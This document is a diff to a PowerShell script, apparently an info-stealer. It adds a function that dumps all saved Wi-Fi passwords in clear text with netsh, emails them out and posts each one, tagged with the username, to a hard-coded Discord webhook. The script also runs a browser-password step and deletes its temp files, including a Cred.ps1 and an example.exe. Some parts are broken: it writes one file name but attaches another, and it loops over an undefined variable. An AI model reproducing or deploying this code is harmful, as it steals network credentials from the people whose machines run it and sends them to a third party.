@@ -172,15 +172,78 @@ function RunWBPV {
                     Add-Type -AssemblyName PresentationFramework
                     [System.Windows.MessageBox]::Show("File not found: $filePath", 'Error')
                 }
-            
-
-            Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
-            Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
-            Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
-            Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
-            Write-Host "Operation $step / $totalSteps is done."
-            SetEmailSentFalse
         }
+
+        Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
+        Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
+        Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
+        Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
+        Write-Host "Operation $step / $totalSteps is done."
+        SetEmailSentFalse
+}
+function GetWifiPasswords {
+    $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
+
+    $results = @()
+
+    foreach ($profile in $wifiProfiles) {
+        $profileDetails = netsh wlan show profile name="$profile" key=clear
+        $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
+        $results += [PSCustomObject]@{
+            ProfileName = $profile
+            KeyContent  = $keyContent
+        }
+    }
+
+    $results | Format-Table -AutoSize
+
+    # Save results to a file
+    $results | Out-File -FilePath "$env:TEMP\Wifi.txt"
+
+
+    # Email file
+    if (-not $isEmailsent) {
+        # Email parameters
+        $subject = "Netsh Profiles - Sent on $currentDateTime"
+        $attachments = @("$env:TEMP\wyfi.txt")  # Array of attachment file paths
+        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+    }
+
+    if (-not $isEmailsent) {
+        foreach ($profile in $profiles) {
+            $wlan = $profile.Matches.Value
+            
+            # Extract the Wi-Fi password
+            try {
+                $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
+            } catch {
+                Write-Host "Failed to retrieve password for $wlan"
+                $passw = "N/A" # Assign a placeholder if password retrieval fails
+            }
+    
+            # Build the message body for the webhook
+            $Body = @{
+                'username' = $env:username + " | " + [string]$wlan
+                'content'  = [string]$passw
+            }
+    
+            # Send the data to the Discord webhook
+            try {
+                Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue | Out-Null
+                Write-Host "Sending to Captain hook"
+            } catch {
+                Write-Host "Failed to send data to Discord webhook. Operation " + $step + "/" + $totalSteps
+            }
+
+            # Increment to the next profile
+            $currentProfile++
+            Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
+        }
+
+    }
+
+    Remove-Item "$env:TEMP\wyfi.txt" -Force -ErrorAction SilentlyContinue
+    SetEmailSentFalse
 }
 
 $webhookUrl = 'https://discord.com/api/webhooks/1297712924281798676/ycVfil-FoOVqAlTxZrp-2aHo8O9eJlCZg8rR279cu7oGwCh-kdq5GxxliUQMVneIkxDX'
@@ -193,7 +256,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
     switch ($step) {
 
         1 { RunWBPV }
-        2 { }
+        2 { GetWifiPasswords }
         3 { }
         4 { }
     }
